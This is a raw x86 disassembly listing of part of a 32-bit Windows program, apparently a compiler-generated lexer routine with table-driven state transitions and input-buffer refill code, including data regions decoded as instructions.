  4041ee:	add    DWORD PTR [eax],eax
  4041f0:	xor    BYTE PTR [ebx],cl
  4041f2:	add    BYTE PTR [eax],al
  4041f4:	cs jb  0x40426a
  4041f7:	jb     0x40425c
  4041f9:	and    al,0x30
  4041fb:	xor    al,BYTE PTR [eax]
	...
  404205:	mov    edi,edi
  404207:	push   ebp
  404208:	mov    ebp,esp
  40420a:	sub    esp,0xc
  40420d:	xor    eax,eax
  40420f:	push   ebx
  404210:	push   esi
  404211:	push   edi
  404212:	cmp    DWORD PTR ds:0x40e00c,eax
  404218:	je     0x40427e
  40421a:	mov    ds:0x40e00c,eax
  40421f:	cmp    DWORD PTR ds:0x411be0,eax
  404225:	jne    0x404231
  404227:	mov    DWORD PTR ds:0x411be0,0x1
  404231:	cmp    DWORD PTR ds:0x411be4,eax
  404237:	jne    0x404245
  404239:	push   eax
  40423a:	call   0x40d391
  40423f:	pop    ecx
  404240:	mov    ds:0x411be4,eax
  404245:	cmp    DWORD PTR ds:0x411bdc,0x0
  40424c:	jne    0x40425b
  40424e:	push   0x1
  404250:	call   0x40d391
  404255:	pop    ecx
  404256:	mov    ds:0x411bdc,eax
  40425b:	mov    ebx,DWORD PTR ds:0x411bd8
  404261:	test   ebx,ebx
  404263:	jne    0x404277
  404265:	mov    ecx,0x4000
  40426a:	call   0x404d83
  40426f:	mov    ebx,eax
  404271:	mov    DWORD PTR ds:0x411bd8,ebx
  404277:	call   0x404d52
  40427c:	jmp    0x404284
  40427e:	mov    ebx,DWORD PTR ds:0x411bd8
  404284:	mov    cl,BYTE PTR ds:0x411c20
  40428a:	mov    eax,ds:0x411bd4
  40428f:	mov    esi,eax
  404291:	mov    DWORD PTR [ebp-0xc],eax
  404294:	mov    BYTE PTR [eax],cl
  404296:	mov    eax,DWORD PTR [ebx+0x1c]
  404299:	mov    ebx,eax
  40429b:	add    ebx,DWORD PTR ds:0x411be0
  4042a1:	mov    DWORD PTR [ebp-0x8],eax
  4042a4:	xor    edi,edi
  4042a6:	movzx  eax,BYTE PTR [esi]
  4042a9:	lea    ecx,[ebx+ebx*1]
  4042ac:	mov    al,BYTE PTR [eax*4+0x4021c0]
  4042b3:	mov    BYTE PTR [ebp-0x1],al
  4042b6:	cmp    WORD PTR [ecx+0x401210],di
  4042bd:	je     0x4042ee
  4042bf:	mov    DWORD PTR ds:0x411c10,ebx
  4042c5:	mov    DWORD PTR ds:0x411c1c,esi
  4042cb:	jmp    0x4042ee
  4042cd:	movsx  ebx,WORD PTR [ecx+0x402010]
  4042d4:	cmp    ebx,0xb2
  4042da:	jl     0x4042e8
  4042dc:	mov    al,BYTE PTR [edx*4+0x401380]
  4042e3:	mov    BYTE PTR [ebp-0x1],al
  4042e6:	jmp    0x4042eb
  4042e8:	mov    al,BYTE PTR [ebp-0x1]
  4042eb:	lea    ecx,[ebx+ebx*1]
  4042ee:	movzx  edx,al
  4042f1:	movsx  eax,WORD PTR [ecx+0x401930]
  4042f8:	add    eax,edx
  4042fa:	movsx  eax,WORD PTR [eax*2+0x401ae0]
  404302:	cmp    eax,ebx
  404304:	jne    0x4042cd
  404306:	movsx  ecx,WORD PTR [ebx*2+0x401930]
  40430e:	movzx  eax,BYTE PTR [ebp-0x1]
  404312:	add    ecx,eax
  404314:	mov    eax,0x27a
  404319:	inc    esi
  40431a:	movsx  ebx,WORD PTR [ecx*2+0x401400]
  404322:	cmp    WORD PTR [ebx*2+0x401930],ax
  40432a:	jne    0x4042a6
  404330:	mov    edi,DWORD PTR [ebp-0xc]
  404333:	mov    DWORD PTR [ebp-0x8],ebx
  404336:	mov    ebx,DWORD PTR ds:0x411bd8
  40433c:	mov    eax,DWORD PTR [ebp-0x8]
  40433f:	movsx  eax,WORD PTR [eax*2+0x401210]
  404347:	mov    DWORD PTR [ebp-0xc],eax
  40434a:	test   eax,eax
  40434c:	jne    0x404364
  40434e:	mov    eax,ds:0x411c10
  404353:	mov    esi,DWORD PTR ds:0x411c1c
  404359:	movsx  eax,WORD PTR [eax*2+0x401210]
  404361:	mov    DWORD PTR [ebp-0xc],eax
  404364:	mov    cl,BYTE PTR [esi]
  404366:	mov    eax,esi
  404368:	sub    eax,edi
  40436a:	mov    BYTE PTR ds:0x411c20,cl
  404370:	mov    ds:0x4128f8,eax
  404375:	mov    edx,edi
  404377:	xor    eax,eax
  404379:	mov    DWORD PTR ds:0x4128fc,edx
  40437f:	mov    BYTE PTR [esi],al
  404381:	mov    eax,DWORD PTR [ebp-0xc]
  404384:	mov    DWORD PTR ds:0x411bd4,esi
  40438a:	cmp    eax,0x19
  40438d:	ja     0x40491a
  404393:	jmp    DWORD PTR [eax*4+0x404925]
  40439a:	mov    eax,esi
  40439c:	mov    BYTE PTR [esi],cl
  40439e:	sub    eax,edx
  4043a0:	dec    eax
  4043a1:	mov    DWORD PTR [ebp-0x8],eax
  4043a4:	xor    eax,eax
  4043a6:	cmp    DWORD PTR [ebx+0x24],eax
  4043a9:	jne    0x4043c1
  4043ab:	mov    eax,DWORD PTR [ebx+0x10]
  4043ae:	mov    ds:0x411c18,eax
  4043b3:	mov    eax,ds:0x411be4
  4043b8:	mov    DWORD PTR [ebx],eax
  4043ba:	mov    DWORD PTR [ebx+0x24],0x1
  4043c1:	mov    eax,DWORD PTR [ebx+0x4]
  4043c4:	add    eax,DWORD PTR ds:0x411c18
  4043ca:	cmp    DWORD PTR ds:0x411bd4,eax
  4043d0:	jbe    0x40445f
  4043d6:	call   0x404992
  4043db:	xor    ecx,ecx
  4043dd:	sub    eax,ecx
  4043df:	je     0x40448d
  4043e5:	sub    eax,0x1
  4043e8:	jne    0x404431
  4043ea:	mov    eax,ds:0x4128fc
  4043ef:	mov    ebx,DWORD PTR ds:0x411bd8
  4043f5:	mov    ds:0x411bd4,eax
  4043fa:	mov    eax,ds:0x411be0
  4043ff:	dec    eax
  404400:	mov    DWORD PTR ds:0x411c14,ecx
  404406:	mov    cl,BYTE PTR ds:0x411c20
  40440c:	cdq    
  40440d:	sub    eax,edx
  40440f:	mov    edx,DWORD PTR ds:0x4128fc
  404415:	sar    eax,1
  404417:	add    eax,0x19
  40441a:	jmp    0x40438a
  40441f:	mov    eax,ds:0x411c10
  404424:	mov    BYTE PTR [esi],cl
  404426:	mov    esi,DWORD PTR ds:0x411c1c
  40442c:	jmp    0x40433f
  404431:	sub    eax,0x1
  404434:	jne    0x40427e
  40443a:	mov    ebx,DWORD PTR ds:0x411bd8
  404440:	mov    esi,DWORD PTR [ebx+0x4]
  404443:	add    esi,DWORD PTR ds:0x411c18
  404449:	mov    DWORD PTR ds:0x411bd4,esi
  40444f:	call   0x404bd8
  404454:	mov    edi,DWORD PTR ds:0x4128fc
  40445a:	jmp    0x40433f
  40445f:	mov    esi,DWORD PTR [ebp-0x8]
  404462:	add    esi,edx
  404464:	mov    DWORD PTR ds:0x411bd4,esi
  40446a:	call   0x404bd8
  40446f:	mov    ecx,eax
  404471:	mov    DWORD PTR [ebp-0x8],eax
  404474:	call   0x404c84
  404479:	mov    edi,DWORD PTR ds:0x4128fc
  40447f:	mov    DWORD PTR [ebp-0xc],edi
  404482:	test   eax,eax
  404484:	je     0x40433c
  40448a:	inc    esi
  40448b:	jmp    0x4044a6
  40448d:	mov    edi,DWORD PTR ds:0x4128fc
  404493:	mov    esi,DWORD PTR [ebp-0x8]
  404496:	add    esi,edi
  404498:	mov    DWORD PTR [ebp-0xc],edi
  40449b:	mov    DWORD PTR ds:0x411bd4,esi
  4044a1:	call   0x404bd8
  4044a6:	mov    DWORD PTR [ebp-0x8],eax
  4044a9:	mov    ebx,eax
  4044ab:	jmp    0x4042a4
  4044b0:	mov    esi,DWORD PTR ds:0x4128f8
  4044b6:	test   esi,esi
  4044b8:	jle    0x40428a
  4044be:	xor    eax,eax
  4044c0:	cmp    BYTE PTR [esi+edx*1-0x1],0xa
  4044c5:	sete   al
  4044c8:	mov    DWORD PTR [ebx+0x1c],eax
  4044cb:	jmp    0x40428a
  4044d0:	mov    ecx,DWORD PTR ds:0x4128f8
  4044d6:	test   ecx,ecx
  4044d8:	jle    0x4044e7
  4044da:	xor    eax,eax
  4044dc:	cmp    BYTE PTR [ecx+edx*1-0x1],0xa
  4044e1:	sete   al
  4044e4:	mov    DWORD PTR [ebx+0x1c],eax
  4044e7:	push   DWORD PTR ds:0x411bdc
  4044ed:	push   0x1
  4044ef:	push   ecx
  4044f0:	push   edx
  4044f1:	call   DWORD PTR ds:0x413188
  4044f7:	add    esp,0x10
  4044fa:	jmp    0x40427e
  4044ff:	mov    BYTE PTR [esi],cl
  404501:	dec    esi
  404502:	mov    ecx,esi
  404504:	mov    DWORD PTR ds:0x4128fc,edi
  40450a:	sub    ecx,edi
  40450c:	mov    DWORD PTR ds:0x411bd4,esi
  404512:	mov    DWORD PTR ds:0x4128f8,ecx
  404518:	mov    al,BYTE PTR [esi]
  40451a:	mov    ds:0x411c20,al
  40451f:	xor    eax,eax
  404521:	mov    BYTE PTR [esi],al
  404523:	test   ecx,ecx
  404525:	jle    0x404534
  404527:	xor    edx,edx
  404529:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  40452e:	sete   dl
  404531:	mov    DWORD PTR [ebx+0x1c],edx
  404534:	xor    edx,edx
  404536:	mov    ecx,edi
  404538:	call   0x408e96
  40453d:	xor    eax,eax
  40453f:	inc    eax
  404540:	pop    edi
  404541:	pop    esi
  404542:	pop    ebx
  404543:	mov    esp,ebp
  404545:	pop    ebp
  404546:	ret    
  404547:	mov    BYTE PTR [esi],cl
  404549:	dec    esi
  40454a:	mov    ecx,esi
  40454c:	mov    DWORD PTR ds:0x4128fc,edi
  404552:	sub    ecx,edi
  404554:	mov    DWORD PTR ds:0x411bd4,esi
  40455a:	mov    DWORD PTR ds:0x4128f8,ecx
  404560:	mov    al,BYTE PTR [esi]
  404562:	mov    ds:0x411c20,al
  404567:	xor    eax,eax
  404569:	mov    BYTE PTR [esi],al
  40456b:	test   ecx,ecx
  40456d:	jle    0x40457a
  40456f:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  404574:	sete   al
  404577:	mov    DWORD PTR [ebx+0x1c],eax
  40457a:	xor    edx,edx
  40457c:	inc    edx
  40457d:	jmp    0x404536
  40457f:	mov    BYTE PTR [esi],cl
  404581:	dec    esi
  404582:	mov    ecx,esi
  404584:	mov    DWORD PTR ds:0x4128fc,edi
  40458a:	sub    ecx,edi
  40458c:	mov    DWORD PTR ds:0x411bd4,esi
  404592:	mov    DWORD PTR ds:0x4128f8,ecx
  404598:	mov    al,BYTE PTR [esi]
  40459a:	mov    ds:0x411c20,al
  40459f:	xor    eax,eax
  4045a1:	mov    BYTE PTR [esi],al
  4045a3:	test   ecx,ecx
  4045a5:	jle    0x4045b2
  4045a7:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  4045ac:	sete   al
  4045af:	mov    DWORD PTR [ebx+0x1c],eax
  4045b2:	xor    eax,eax
  4045b4:	jmp    0x404540
  4045b6:	mov    BYTE PTR [esi],cl
  4045b8:	dec    esi
  4045b9:	mov    ecx,esi
  4045bb:	mov    DWORD PTR ds:0x4128fc,edi
  4045c1:	sub    ecx,edi
  4045c3:	mov    DWORD PTR ds:0x411bd4,esi
  4045c9:	mov    DWORD PTR ds:0x4128f8,ecx
  4045cf:	mov    al,BYTE PTR [esi]
  4045d1:	mov    ds:0x411c20,al
  4045d6:	xor    eax,eax
  4045d8:	mov    BYTE PTR [esi],al
  4045da:	test   ecx,ecx
  4045dc:	jle    0x4045e9
  4045de:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  4045e3:	sete   al
  4045e6:	mov    DWORD PTR [ebx+0x1c],eax
  4045e9:	xor    edx,edx
  4045eb:	mov    ecx,0x40e018
  4045f0:	inc    edx
  4045f1:	jmp    0x404538
  4045f6:	mov    BYTE PTR [esi],cl
  4045f8:	dec    esi
  4045f9:	mov    ecx,esi
  4045fb:	mov    DWORD PTR ds:0x411bd4,esi
  404601:	sub    ecx,edi
  404603:	mov    DWORD PTR ds:0x4128fc,edi
  404609:	mov    DWORD PTR ds:0x4128f8,ecx
  40460f:	mov    al,BYTE PTR [esi]
  404611:	mov    ds:0x411c20,al
  404616:	xor    eax,eax
  404618:	mov    BYTE PTR [esi],al
  40461a:	test   ecx,ecx
  40461c:	jle    0x404629
  40461e:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  404623:	sete   al
  404626:	mov    DWORD PTR [ebx+0x1c],eax
  404629:	push   0x25
  40462b:	push   0x2
  40462d:	call   0x40b328
  404632:	pop    ecx
  404633:	pop    ecx
  404634:	jmp    0x40453d
  404639:	mov    BYTE PTR [esi],cl
  40463b:	dec    esi
  40463c:	mov    ecx,esi
  40463e:	mov    DWORD PTR ds:0x4128fc,edi
  404644:	sub    ecx,edi
  404646:	mov    DWORD PTR ds:0x411bd4,esi
  40464c:	mov    DWORD PTR ds:0x4128f8,ecx
  404652:	mov    al,BYTE PTR [esi]
  404654:	mov    ds:0x411c20,al
  404659:	xor    eax,eax
  40465b:	mov    BYTE PTR [esi],al
  40465d:	test   ecx,ecx
  40465f:	jle    0x40466c
  404661:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  404666:	sete   al
  404669:	mov    DWORD PTR [ebx+0x1c],eax
  40466c:	call   0x4087b4
  404671:	jmp    0x40453d
  404676:	mov    BYTE PTR [esi],cl
  404678:	dec    esi
  404679:	mov    ecx,esi
  40467b:	mov    DWORD PTR ds:0x4128fc,edi
  404681:	sub    ecx,edi
  404683:	mov    DWORD PTR ds:0x411bd4,esi
  404689:	mov    DWORD PTR ds:0x4128f8,ecx
  40468f:	mov    al,BYTE PTR [esi]
  404691:	mov    ds:0x411c20,al
  404696:	xor    eax,eax
  404698:	mov    BYTE PTR [esi],al
  40469a:	test   ecx,ecx
  40469c:	jle    0x4046a9
  40469e:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  4046a3:	sete   al
  4046a6:	mov    DWORD PTR [ebx+0x1c],eax
  4046a9:	xor    edx,edx
  4046ab:	inc    edx
  4046ac:	call   0x4074ec
  4046b1:	jmp    0x40453d
  4046b6:	mov    BYTE PTR [esi],cl
  4046b8:	dec    esi
  4046b9:	mov    ecx,esi
  4046bb:	mov    DWORD PTR ds:0x4128fc,edi
  4046c1:	sub    ecx,edi
  4046c3:	mov    DWORD PTR ds:0x411bd4,esi
  4046c9:	mov    DWORD PTR ds:0x4128f8,ecx
  4046cf:	mov    al,BYTE PTR [esi]
  4046d1:	mov    ds:0x411c20,al
  4046d6:	xor    eax,eax
  4046d8:	mov    BYTE PTR [esi],al
  4046da:	test   ecx,ecx
  4046dc:	jle    0x4046e9
  4046de:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  4046e3:	sete   al
  4046e6:	mov    DWORD PTR [ebx+0x1c],eax
  4046e9:	xor    edx,edx
  4046eb:	jmp    0x4046ac
  4046ed:	mov    BYTE PTR [esi],cl
  4046ef:	dec    esi
  4046f0:	mov    ecx,esi
  4046f2:	mov    DWORD PTR ds:0x4128fc,edi
  4046f8:	sub    ecx,edi
  4046fa:	mov    DWORD PTR ds:0x411bd4,esi
  404700:	mov    DWORD PTR ds:0x4128f8,ecx
  404706:	mov    al,BYTE PTR [esi]
  404708:	mov    ds:0x411c20,al
  40470d:	xor    eax,eax
  40470f:	mov    BYTE PTR [esi],al
  404711:	test   ecx,ecx
  404713:	jle    0x404720
  404715:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  40471a:	sete   al
  40471d:	mov    DWORD PTR [ebx+0x1c],eax
  404720:	xor    edx,edx
  404722:	inc    edx
  404723:	call   0x4073cd
  404728:	jmp    0x40453d
  40472d:	mov    BYTE PTR [esi],cl
  40472f:	dec    esi
  404730:	mov    ecx,esi
  404732:	mov    DWORD PTR ds:0x4128fc,edi
  404738:	sub    ecx,edi
  40473a:	mov    DWORD PTR ds:0x411bd4,esi
  404740:	mov    DWORD PTR ds:0x4128f8,ecx
  404746:	mov    al,BYTE PTR [esi]
  404748:	mov    ds:0x411c20,al
  40474d:	xor    eax,eax
  40474f:	mov    BYTE PTR [esi],al
  404751:	test   ecx,ecx
  404753:	jle    0x404760
  404755:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  40475a:	sete   al
  40475d:	mov    DWORD PTR [ebx+0x1c],eax
  404760:	xor    edx,edx
  404762:	jmp    0x404723
  404764:	mov    BYTE PTR [esi],cl
  404766:	dec    esi
  404767:	mov    ecx,esi
  404769:	mov    DWORD PTR ds:0x4128fc,edi
  40476f:	sub    ecx,edi
  404771:	mov    DWORD PTR ds:0x411bd4,esi
  404777:	mov    DWORD PTR ds:0x4128f8,ecx
  40477d:	mov    al,BYTE PTR [esi]
  40477f:	mov    ds:0x411c20,al
  404784:	xor    eax,eax
  404786:	mov    BYTE PTR [esi],al
  404788:	test   ecx,ecx
  40478a:	jle    0x404797
  40478c:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  404791:	sete   al
  404794:	mov    DWORD PTR [ebx+0x1c],eax
  404797:	mov    ecx,edi
  404799:	call   0x4094e3
  40479e:	jmp    0x40453d
  4047a3:	mov    BYTE PTR [esi],cl
  4047a5:	dec    esi
  4047a6:	mov    ecx,esi
  4047a8:	mov    DWORD PTR ds:0x4128fc,edi
  4047ae:	sub    ecx,edi
  4047b0:	mov    DWORD PTR ds:0x411bd4,esi
  4047b6:	mov    DWORD PTR ds:0x4128f8,ecx
  4047bc:	mov    al,BYTE PTR [esi]
  4047be:	mov    ds:0x411c20,al
  4047c3:	xor    eax,eax
  4047c5:	mov    BYTE PTR [esi],al
  4047c7:	test   ecx,ecx
  4047c9:	jle    0x4047d6
  4047cb:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  4047d0:	sete   al
  4047d3:	mov    DWORD PTR [ebx+0x1c],eax
  4047d6:	push   0xcf
  4047db:	push   0x1
  4047dd:	jmp    0x40462d
  4047e2:	mov    BYTE PTR [esi],cl
  4047e4:	dec    esi
  4047e5:	mov    ecx,esi
  4047e7:	mov    DWORD PTR ds:0x4128fc,edi
  4047ed:	sub    ecx,edi
  4047ef:	mov    DWORD PTR ds:0x411bd4,esi
  4047f5:	mov    DWORD PTR ds:0x4128f8,ecx
  4047fb:	mov    al,BYTE PTR [esi]
  4047fd:	mov    ds:0x411c20,al
  404802:	xor    eax,eax
  404804:	mov    BYTE PTR [esi],al
  404806:	test   ecx,ecx
  404808:	jle    0x404815
  40480a:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  40480f:	sete   al
  404812:	mov    DWORD PTR [ebx+0x1c],eax
  404815:	xor    edx,edx
  404817:	inc    edx
  404818:	mov    ecx,edi
  40481a:	call   0x4091cb
  40481f:	jmp    0x40453d
  404824:	mov    BYTE PTR [esi],cl
  404826:	dec    esi
  404827:	mov    ecx,esi
  404829:	mov    DWORD PTR ds:0x4128fc,edi
  40482f:	sub    ecx,edi
  404831:	mov    DWORD PTR ds:0x411bd4,esi
  404837:	mov    DWORD PTR ds:0x4128f8,ecx
  40483d:	mov    al,BYTE PTR [esi]
  40483f:	mov    ds:0x411c20,al
  404844:	xor    eax,eax
  404846:	mov    BYTE PTR [esi],al
  404848:	test   ecx,ecx
  40484a:	jle    0x404857
  40484c:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  404851:	sete   al
  404854:	mov    DWORD PTR [ebx+0x1c],eax
  404857:	xor    edx,edx
  404859:	jmp    0x404818
  40485b:	mov    BYTE PTR [esi],cl
  40485d:	dec    esi
  40485e:	mov    ecx,esi
  404860:	mov    DWORD PTR ds:0x4128fc,edi
  404866:	sub    ecx,edi
  404868:	mov    DWORD PTR ds:0x411bd4,esi
  40486e:	mov    DWORD PTR ds:0x4128f8,ecx
  404874:	mov    al,BYTE PTR [esi]
  404876:	mov    ds:0x411c20,al
  40487b:	xor    eax,eax
  40487d:	mov    BYTE PTR [esi],al
  40487f:	test   ecx,ecx
  404881:	jle    0x40488e
  404883:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  404888:	sete   al
  40488b:	mov    DWORD PTR [ebx+0x1c],eax
  40488e:	xor    edx,edx
  404890:	inc    edx
  404891:	call   0x40931b
  404896:	jmp    0x40453d
  40489b:	mov    BYTE PTR [esi],cl
  40489d:	dec    esi
  40489e:	mov    ecx,esi
  4048a0:	mov    DWORD PTR ds:0x4128fc,edi
  4048a6:	sub    ecx,edi
  4048a8:	mov    DWORD PTR ds:0x411bd4,esi
  4048ae:	mov    DWORD PTR ds:0x4128f8,ecx
  4048b4:	mov    al,BYTE PTR [esi]
  4048b6:	mov    ds:0x411c20,al
  4048bb:	xor    eax,eax
  4048bd:	mov    BYTE PTR [esi],al
  4048bf:	test   ecx,ecx
  4048c1:	jle    0x4048ce
  4048c3:	cmp    BYTE PTR [ecx+edi*1-0x1],0xa
  4048c8:	sete   al
  4048cb:	mov    DWORD PTR [ebx+0x1c],eax
  4048ce:	xor    edx,edx
  4048d0:	jmp    0x404891
  4048d2:	mov    ecx,DWORD PTR ds:0x4128f8
  4048d8:	test   ecx,ecx
  4048da:	jle    0x40453d
  4048e0:	xor    eax,eax
  4048e2:	cmp    BYTE PTR [ecx+edx*1-0x1],0xa
  4048e7:	sete   al
  4048ea:	mov    DWORD PTR [ebx+0x1c],eax
  4048ed:	jmp    0x40453d
  4048f2:	mov    ecx,DWORD PTR ds:0x4128f8
  4048f8:	test   ecx,ecx
  4048fa:	jle    0x404909
  4048fc:	xor    eax,eax
  4048fe:	cmp    BYTE PTR [ecx+edx*1-0x1],0xa
  404903:	sete   al
  404906:	mov    DWORD PTR [ebx+0x1c],eax
  404909:	push   edx
  40490a:	push   0x4010f0
  40490f:	call   DWORD PTR ds:0x413198
  404915:	jmp    0x404632
  40491a:	mov    ecx,0x40110c
  40491f:	call   0x404e20
  404924:	nop
  404925:	pop    ds
  404926:	inc    esp
  404927:	inc    eax
  404928:	add    bh,bh
  40492a:	inc    esp
  40492b:	inc    eax
  40492c:	add    BYTE PTR [edi+0x45],al
  40492f:	inc    eax
  404930:	add    BYTE PTR [edi+0x45],bh
  404933:	inc    eax
  404934:	add    BYTE PTR [edi+0x45],bh
  404937:	inc    eax
  404938:	add    BYTE PTR [esi-0x9ffbfbb],dh
  40493e:	inc    ebp
  40493f:	inc    eax
  404940:	add    dh,dh
  404942:	inc    ebp
  404943:	inc    eax
  404944:	add    BYTE PTR [ecx],bh
  404946:	inc    esi
  404947:	inc    eax
  404948:	add    BYTE PTR [esi+0x46],dh
  40494b:	inc    eax
  40494c:	add    BYTE PTR [esi-0x12ffbfba],dh
  404952:	inc    esi
  404953:	inc    eax
  404954:	add    BYTE PTR ds:0x64004047,ch
  40495a:	inc    edi
  40495b:	inc    eax
  40495c:	add    BYTE PTR [ebx-0x5cffbfb9],ah
  404962:	inc    edi
  404963:	inc    eax
  404964:	add    dl,ah
  404966:	inc    edi
  404967:	inc    eax
  404968:	add    BYTE PTR [eax+ecx*2],ah
  40496b:	inc    eax
  40496c:	add    BYTE PTR [ebx+0x48],bl
  40496f:	inc    eax
  404970:	add    BYTE PTR [ebx-0x2dffbfb8],bl
  404976:	dec    eax
  404977:	inc    eax
  404978:	add    dl,dh
  40497a:	dec    eax
  40497b:	inc    eax
  40497c:	add    BYTE PTR [eax-0x2fffbfbc],dh
  404982:	inc    esp
  404983:	inc    eax
  404984:	add    BYTE PTR [edx-0x4dffbfbd],bl
  40498a:	inc    ebp
  40498b:	inc    eax
  40498c:	add    ah,cl
  40498e:	int3   
  40498f:	int3   
  404990:	int3   
  404991:	int3   
  404992:	mov    edi,edi
  404994:	push   ebp
  404995:	mov    ebp,esp
  404997:	push   ecx
  404998:	push   ecx
  404999:	mov    eax,ds:0x411c18
  40499e:	mov    ecx,DWORD PTR ds:0x411bd4
  4049a4:	inc    eax
  4049a5:	push   esi
  4049a6:	mov    esi,DWORD PTR ds:0x411bd8
  4049ac:	mov    edx,DWORD PTR [esi+0x4]
  4049af:	add    eax,edx
  4049b1:	cmp    ecx,eax
  4049b3:	ja     0x404bc8
  4049b9:	cmp    DWORD PTR [esi+0x20],0x0
  4049bd:	jne    0x4049d3
  4049bf:	sub    ecx,DWORD PTR ds:0x4128fc
  4049c5:	xor    eax,eax
  4049c7:	cmp    ecx,0x1
  4049ca:	setne  al
  4049cd:	inc    eax
  4049ce:	jmp    0x404bc3
  4049d3:	push   ebx
  4049d4:	push   edi
  4049d5:	mov    edi,ecx
  4049d7:	xor    ebx,ebx
  4049d9:	sub    edi,DWORD PTR ds:0x4128fc
  4049df:	dec    edi
  4049e0:	mov    DWORD PTR [ebp-0x4],edi
  4049e3:	test   edi,edi
  4049e5:	jle    0x4049fe
  4049e7:	mov    esi,DWORD PTR ds:0x4128fc
  4049ed:	mov    al,BYTE PTR [esi+ebx*1]
  4049f0:	mov    BYTE PTR [edx],al
  4049f2:	inc    edx
  4049f3:	inc    ebx
  4049f4:	cmp    ebx,edi
  4049f6:	jl     0x4049ed
  4049f8:	mov    esi,DWORD PTR ds:0x411bd8
  4049fe:	xor    eax,eax
  404a00:	inc    eax
  404a01:	cmp    DWORD PTR [esi+0x24],0x2
  404a05:	jne    0x404a1a
  404a07:	mov    ebx,DWORD PTR [ebp-0x4]
  404a0a:	xor    edi,edi
  404a0c:	and    DWORD PTR [esi+0x10],edi
  404a0f:	mov    DWORD PTR ds:0x411c18,edi
  404a15:	jmp    0x404b7d
  404a1a:	mov    edx,DWORD PTR [esi+0xc]
  404a1d:	mov    ebx,edx
  404a1f:	sub    ebx,edi
  404a21:	dec    ebx
  404a22:	test   ebx,ebx
  404a24:	jg     0x404a88
  404a26:	sub    ecx,DWORD PTR [esi+0x4]
  404a29:	cmp    DWORD PTR [esi+0x14],0x0
  404a2d:	mov    DWORD PTR [ebp-0x8],ecx
  404a30:	je     0x404a62
  404a32:	lea    eax,[edx+edx*1]
  404a35:	test   eax,eax
  404a37:	jg     0x404a40
  404a39:	mov    eax,edx
  404a3b:	shr    eax,0x3
  404a3e:	add    eax,edx
  404a40:	lea    ecx,[eax+0x2]
  404a43:	mov    DWORD PTR [esi+0xc],eax
  404a46:	cmp    ecx,eax
  404a48:	jb     0x404ae9
  404a4e:	push   ecx
  404a4f:	push   DWORD PTR [esi+0x4]
  404a52:	call   DWORD PTR ds:0x413184
  404a58:	pop    ecx
  404a59:	pop    ecx
  404a5a:	mov    ecx,DWORD PTR [ebp-0x8]
  404a5d:	mov    DWORD PTR [esi+0x4],eax
  404a60:	jmp    0x404a66
  404a62:	and    DWORD PTR [esi+0x4],0x0
  404a66:	mov    eax,DWORD PTR [esi+0x4]
  404a69:	test   eax,eax
  404a6b:	je     0x404af3
  404a71:	mov    edx,DWORD PTR [esi+0xc]
  404a74:	add    ecx,eax
  404a76:	mov    ebx,edx
  404a78:	mov    DWORD PTR ds:0x411bd4,ecx
  404a7e:	sub    ebx,edi
  404a80:	dec    ebx
  404a81:	test   ebx,ebx
  404a83:	jle    0x404a26
  404a85:	xor    eax,eax
  404a87:	inc    eax
  404a88:	mov    ecx,0x2000
  404a8d:	cmp    ebx,ecx
  404a8f:	jle    0x404a93
  404a91:	mov    ebx,ecx
  404a93:	cmp    DWORD PTR [esi+0x18],0x0
  404a97:	je     0x404b33
  404a9d:	xor    edi,edi
  404a9f:	test   ebx,ebx
  404aa1:	jle    0x404b28
  404aa7:	push   DWORD PTR ds:0x411be4
  404aad:	call   DWORD PTR ds:0x41315c
  404ab3:	mov    esi,DWORD PTR ds:0x411bd8
  404ab9:	mov    edx,eax
  404abb:	pop    ecx
  404abc:	cmp    edx,0xffffffff
  404abf:	je     0x404ad6
  404ac1:	cmp    edx,0xa
  404ac4:	je     0x404adb
  404ac6:	mov    ecx,DWORD PTR [esi+0x4]
  404ac9:	mov    eax,DWORD PTR [ebp-0x4]
  404acc:	add    ecx,edi
  404ace:	inc    edi
  404acf:	mov    BYTE PTR [ecx+eax*1],dl
  404ad2:	cmp    edi,ebx
  404ad4:	jl     0x404aa7
  404ad6:	cmp    edx,0xa
  404ad9:	jne    0x404afd
  404adb:	mov    eax,DWORD PTR [esi+0x4]
  404ade:	mov    ebx,DWORD PTR [ebp-0x4]
  404ae1:	add    eax,edi
  404ae3:	inc    edi
  404ae4:	mov    BYTE PTR [eax+ebx*1],dl
  404ae7:	jmp    0x404b00
  404ae9:	mov    ecx,0x401178
  404aee:	jmp    0x404bcd
  404af3:	mov    ecx,0x40118c
  404af8:	jmp    0x404bcd
  404afd:	mov    ebx,DWORD PTR [ebp-0x4]
  404b00:	cmp    edx,0xffffffff
  404b03:	jne    0x404b2b
  404b05:	push   DWORD PTR ds:0x411be4
  404b0b:	call   DWORD PTR ds:0x41318c
  404b11:	pop    ecx
  404b12:	test   eax,eax
  404b14:	je     0x404b20
  404b16:	mov    ecx,0x4011b8
  404b1b:	jmp    0x404bcd
  404b20:	mov    esi,DWORD PTR ds:0x411bd8
  404b26:	jmp    0x404b2b
  404b28:	mov    ebx,DWORD PTR [ebp-0x4]
  404b2b:	mov    DWORD PTR ds:0x411c18,edi
  404b31:	jmp    0x404b76
  404b33:	push   DWORD PTR ds:0x411be4
  404b39:	push   ebx
  404b3a:	push   eax
  404b3b:	mov    eax,DWORD PTR [esi+0x4]
  404b3e:	add    eax,edi
  404b40:	push   eax
  404b41:	call   DWORD PTR ds:0x413194
  404b47:	mov    edi,eax
  404b49:	add    esp,0x10
  404b4c:	mov    DWORD PTR ds:0x411c18,edi
  404b52:	test   edi,edi
  404b54:	jne    0x404b6d
  404b56:	push   DWORD PTR ds:0x411be4
  404b5c:	call   DWORD PTR ds:0x41318c
  404b62:	pop    ecx
  404b63:	test   eax,eax
  404b65:	jne    0x404b16
